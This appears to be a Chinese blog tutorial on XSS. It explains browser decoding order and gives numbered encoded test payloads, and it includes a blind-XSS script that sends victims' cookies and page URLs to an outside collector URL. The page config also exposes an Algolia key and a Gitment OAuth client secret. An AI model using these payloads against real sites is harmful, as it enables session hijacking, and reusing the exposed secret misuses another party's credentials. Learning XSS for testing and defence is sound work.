<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="xss漏洞"><meta name="keywords" content="xss"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>xss漏洞【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#页面解码"><span class="toc-number">1.</span> <span class="toc-text">页面解码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解码机制"><span class="toc-number">1.1.</span> <span class="toc-text">解码机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解码顺序"><span class="toc-number">1.2.</span> <span class="toc-text">解码顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试样例"><span class="toc-number">1.3.</span> <span class="toc-text">测试样例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反射性"><span class="toc-number">2.</span> <span class="toc-text">反射性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#存储型"><span class="toc-number">3.</span> <span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-盲打后台"><span class="toc-number">3.1.</span> <span class="toc-text">XSS 盲打后台</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DOM型"><span class="toc-number">4.</span> <span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#在前端实现页面跳转"><span class="toc-number">4.1.</span> <span class="toc-text">在前端实现页面跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用indexOf判断URL参数是否合法"><span class="toc-number">4.1.1.</span> <span class="toc-text">使用indexOf判断URL参数是否合法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正则表达式缺陷"><span class="toc-number">4.1.2.</span> <span class="toc-text">正则表达式缺陷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#取值写入页面或动态执行"><span class="toc-number">4.2.</span> <span class="toc-text">取值写入页面或动态执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL中的取参数值写入页面或动态执行"><span class="toc-number">4.2.1.</span> <span class="toc-text">URL中的取参数值写入页面或动态执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie取参数值写入页面或动态执行"><span class="toc-number">4.2.2.</span> <span class="toc-text">Cookie取参数值写入页面或动态执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#localStorage、Referer、Window-name、SessionStorage"><span class="toc-number">4.2.3.</span> <span class="toc-text">localStorage、Referer、Window name、SessionStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-number">4.2.4.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#标签利用"><span class="toc-number">5.</span> <span class="toc-text">标签利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#img"><span class="toc-number">5.1.</span> <span class="toc-text">img</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a"><span class="toc-number">5.2.</span> <span class="toc-text">a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input"><span class="toc-number">5.3.</span> <span class="toc-text">input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#form"><span class="toc-number">5.4.</span> <span class="toc-text">form</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe"><span class="toc-number">5.5.</span> <span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#svg"><span class="toc-number">5.6.</span> <span class="toc-text">svg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#detail"><span class="toc-number">5.7.</span> <span class="toc-text">detail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select"><span class="toc-number">5.8.</span> <span class="toc-text">select</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#video"><span class="toc-number">5.9.</span> <span class="toc-text">video</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#audio"><span class="toc-number">5.10.</span> <span class="toc-text">audio</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#body"><span class="toc-number">5.11.</span> <span class="toc-text">body</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#textarea"><span class="toc-number">5.12.</span> <span class="toc-text">textarea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#keygen"><span class="toc-number">5.13.</span> <span class="toc-text">keygen</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP"><span class="toc-number">6.</span> <span class="toc-text">CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP启用方法"><span class="toc-number">6.1.</span> <span class="toc-text">CSP启用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制选项"><span class="toc-number">6.2.</span> <span class="toc-text">限制选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Security-Policy-Report-Only"><span class="toc-number">6.3.</span> <span class="toc-text">Content-Security-Policy-Report-Only</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#选项值"><span class="toc-number">6.4.</span> <span class="toc-text">选项值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script-src-的特殊值"><span class="toc-number">6.5.</span> <span class="toc-text">script-src 的特殊值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意点"><span class="toc-number">6.6.</span> <span class="toc-text">注意点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例题"><span class="toc-number">7.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华东北赛区-Web2"><span class="toc-number">7.1.</span> <span class="toc-text">[CISCN2019 华东北赛区]Web2</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color5"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color6"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">198</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">xss漏洞</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2019-03-16 | 更新于 2021-06-12</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/xss/">xss</a></div></div></div><div class="main-content"><p>XSS (Cross-Site Script, 跨站脚本)是由于 web 应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击</p>
<a id="more"></a>
<p><img src="../../images/loopholes/xss/xss.png" alt=""></p>
<h1 id="页面解码"><a href="#页面解码" class="headerlink" title="页面解码"></a>页面解码</h1><p>详细查看此篇文章：<br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md</a></p>
<h2 id="解码机制"><a href="#解码机制" class="headerlink" title="解码机制"></a>解码机制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> HtmlEncode(str) &#123;</span><br><span class="line">    var s = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (str.length == 0) <span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line">    s = str.replace(/&amp;/g, <span class="string">"&amp;amp;"</span>);</span><br><span class="line">    s = s.replace(/&lt;/g, <span class="string">"&amp;lt;"</span>);</span><br><span class="line">    s = s.replace(/&gt;/g, <span class="string">"&amp;gt;"</span>);</span><br><span class="line">    s = s.replace(/\"/g, <span class="string">"&amp;quot;"</span>);</span><br><span class="line">    <span class="built_in">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">A: &lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> value=<span class="string">"exec"</span> onclick=<span class="string">"document.write (HtmlEncode('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;'))"</span> /&gt; &lt;/br&gt;</span><br><span class="line">B: &lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> value=<span class="string">"exec"</span> onclick=<span class="string">"document.write (HtmlEncode('&lt;img src=@ onerror=alert(123) /&gt;'))"</span> /&gt;</span><br></pre></td></tr></table></figure>
<p>上面两条的执行结果是一样的，都只是在网页中输出了<code>&lt;img src=@ onerror=alert(123) /&gt;</code> 而没有弹框， 只不过A中的js代码在执行前已经先按照html的形式解码了<br><img src="../../images/loopholes/xss/1.png" alt=""><br>关键的问题是这里的js代码是出现在html标签之间的，因为嵌入到html标签中的js 代码在解析之前会先按照html规则进行自动解码，包括： 进制编码：&amp;#xH（十六进制格式）、&amp;#D（十进制格式）。<br>HTML 实体编码，下面是 html5 新增的实体编码：<br>&colon; =&gt; [冒号]<br>&NewLine; =&gt; [换行]<br>case: <code>&lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;/a&gt;</code><br><img src="../../images/loopholes/xss/3.png" alt=""><br>以上是关于js在html内的解码，那么假如用户的输入后所传递的值并不是出现在html标签之内，而是出现在js中呢？ 浏览器也有js的解析规则，还是举例子来说明</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> document.write(<span class="string">'&amp;lt;img src=@ onerror=alert(2) /&amp;gt;'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/xss/2.png" alt=""><br>上边的例子会弹出对话框吗?是不会的，因为它出现在js代码之中，上下文环境为JavaScript，浏览器解析前会将出现在js代码中的以下内容编码进行解码<br>1):UniCode形式(\uH)  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> document.write(<span class="string">'\u003Cimg src=@ onerror=alert(123) /\u003E'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/xss/4.png" alt=""><br>2):普通16进制(\xHH) 或者 8进制([0-7]{1,3})</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> document.write(<span class="string">'\x3Cimg src=@ onerror=alert(123) /\x3E'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>3)纯转义，如果用户带入js代码的内容中含有 ‘、”、&lt; 、&gt; 这些字符将他们进行转义是没有意义的，还是会原样的输出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> //document.write(<span class="string">'\&lt;img src=@ onerror=alert(123) /\&gt;'</span>); //弹框</span><br><span class="line"> //document.write(<span class="string">'te\'</span>st<span class="string">'); //te'</span>st</span><br><span class="line"> //document.write(<span class="string">'te\"st'</span>); //te<span class="string">"st</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>具有 HtmlEncode 功能的标签<br>如 <code>&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;、&lt;xmp&gt;、&lt;plaintext&gt;， html</code> 在这些标签里面是不解析的，比如 <code>$(&#39;tt&#39;).innerHTML=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;</code>，不会造成弹框。<code>&lt;xmp&gt;</code> 没有HtmlEncode 功能，<code>&lt;plaintext&gt;</code> 在 Firefox 下不会进行 HtmlEncode 编码，而在 Chrome 下面会</p>
<h2 id="解码顺序"><a href="#解码顺序" class="headerlink" title="解码顺序"></a>解码顺序</h2><p>第一个例子:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript&amp;#58;&amp;#32;alert('\&lt;http&amp;#58;&amp;#47;&amp;#47;simba.cc/find?q=%E4%BD%A0%E5%A5%BD\&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>首先进行html解码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript: alert('\&lt;http://simba.cc/find?q=%E4%BD%A0%E5%A5%BD\&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>点击链接后，先是 URL 解码，结果为（假设是 style 属性，则会执行 css 解码） </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript: alert('\&lt;http://simba.cc/find?q=你好\&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>最后是 JS 解码，结果为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript: alert('&lt;http://simba.cc/find?q=你好&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>第二个例子</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">     &lt;head&gt;</span><br><span class="line">          &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">     &lt;body&gt;</span><br><span class="line">          &lt;a href=<span class="string">"javascript:alert('&lt;?php echo <span class="variable">$_GET</span>['input'];?&gt;');"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br><span class="line">     &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当参数input的值为: %26lt%5cu4e00%26gt 的时候，因为 php 使用 $_GET 获取参数值（urldecode），故返回的 html 源码是 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href=<span class="string">"javascript:alert('&amp;lt\u4e00&amp;gt');"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器解析时 html 解码 为 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('&lt;\u4e00&gt;');"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>点击时进行 js 解码，故弹框为 &lt;一&gt;<br><img src="../../images/loopholes/xss/5.png" alt=""></p>
<h2 id="测试样例"><a href="#测试样例" class="headerlink" title="测试样例"></a>测试样例</h2><p>1.<code>URL encoded &quot;javascript:alert(1)&quot;</code><br>不会触发。javascript: 是 scheme，不能进行urlencode，否则 urldecode 时出现 “no scheme” 状态。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>2.<code>Character entity encoded &quot;javascript&quot; and URL encoded &quot;alert(2)&quot;</code><br>触发。先进行 htmldecode，点击执行urldecode，最后执行 js</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>3.<code>URL encoded &quot;:&quot;</code><br>不会触发。冒号是 scheme 的一部分。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript%3aalert(3)"</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>4.<code>Character entity encoded &lt; and &gt;</code><br>不会触发。&lt; &gt; 是识别 tag 的开始结束符，不能进行编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;<span class="comment">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.<code>Character entity encoded &lt; and &gt;</code><br>如前所述，textarea 等标签内不会进行 htmldecode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;<span class="comment">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br></pre></td></tr></table></figure>
<p>6.不会触发。textarea 标签内不会执行 js，除非我们先把它闭合了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
<p>7.<code>Character entity encoded</code><br>触发。先进行 htmldecode，点击触发 js 事件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">"confirm('7&amp;#39;);"</span>&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>8.<code>Unicode escape sequence encoded</code><br>不会触发。’ “ ( ) 的unicode 编码形式在这里只是字符串的文本含义，并不能表示真正的引号闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">"confirm('8\u0027);"</span>&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>9.<code>Character entity encoded alert(9);</code><br>不会触发。script 域内不会进行 htmldecode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&amp;<span class="comment">#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>10.<code>Unicode Escape sequence encoded alert</code><br>触发。function name 是 identifier name，可以用unicode 方式编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;&lt;a href=<span class="string">"javascript:\u0061lert('1\x62')"</span>&gt;ga&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"\u0061\u006c\u0065\u0072\u0074(1)"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>11.<code>Unicode Escape sequence encoded alert(11)</code><br>不会触发。同问题2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>12 <code>Unicode Escape sequence encoded alert and 12</code><br>不会触发。unicode 编码的 1, 2 在这里不能表示成字符串，因为它们不是被包裹在 ‘ “ 中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>可以触发的三个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(<span class="string">'\u0031\u0032'</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(/\u0031\u0032/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(12)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>13.<code>Unicode escape sequence encoded &#39;</code><br>不会触发。同问题2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'13\u0027)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>14.Unicode escape sequence encoded line feed.<br>触发。unicode 编码的换行符在这里并不会真正地换行而导致js 语法错误，而是普通的文本含义 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'14\u000a'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="反射性"><a href="#反射性" class="headerlink" title="反射性"></a>反射性</h1><p><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md</a></p>
<h1 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h1><p>可以看此文章：<br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md</a>   </p>
<h2 id="XSS-盲打后台"><a href="#XSS-盲打后台" class="headerlink" title="XSS 盲打后台"></a>XSS 盲打后台</h2><p>js弹cookie代码 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">  (new Image()).src=<span class="string">'http://simba.im/js/xss.php?cookie='</span>+</span><br><span class="line">  escape(</span><br><span class="line">    (<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        <span class="built_in">return</span> document.cookie</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">    )+<span class="string">'&amp;location='</span>+</span><br><span class="line">  escape(</span><br><span class="line">    (<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        <span class="built_in">return</span> document.location.href</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">    );</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>服务器接收代码</p>
